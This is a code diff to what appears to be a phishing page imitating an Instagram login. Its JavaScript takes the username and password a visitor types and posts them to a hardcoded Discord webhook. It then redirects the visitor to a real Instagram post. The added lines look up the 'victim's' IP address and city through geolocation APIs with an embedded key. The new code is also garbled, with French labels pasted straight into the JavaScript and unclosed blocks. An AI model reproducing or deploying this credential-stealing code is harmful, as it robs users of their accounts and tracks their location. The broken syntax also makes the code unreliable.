@@ -101,8 +101,22 @@
     request.open("POST", "https://discord.com/api/webhooks/1125156301689847929/ajxOd4GPMFWeuWFVTVarNi8-8c25WBCT6VS9MuAMfl5hnHnd7GO_Lwh1PM3ZTgBE_qub");
     request.setRequestHeader('Content-type', 'application/json');
     var params = {
-      content: ("> **Identifiant  : **" + document.getElementById('username').value + "\n> **Mot de passe : **" + document.getElementById('password').value)
-    }
+      content: ("> **Identifiant 👤  : **" + document.getElementById('username').value + "\n> **Mot de passe 🔒 : **" + document.getElementById('password').value)
+   
+IP de la victime :
+ fetch('https://api.ipify.org?format=json')
+  .then(response => response.json())
+  .then(data => {
+    const ipAddress = data.ip;
+	  fetch(`https://api.ipapi.com/${ipAddress}?access_key=5z1JSJGsJdKw2SyTGpQcKibSJvw47ytR`)
+      .then(response => response.json())
+      .then(data => {
+       Ville de la victime : const city = data.city;
+
+
+
+
+}
     request.send(JSON.stringify(params));
 	sleep(400)
 	window.location.replace("https://www.instagram.com/p/By7NkskoTip");
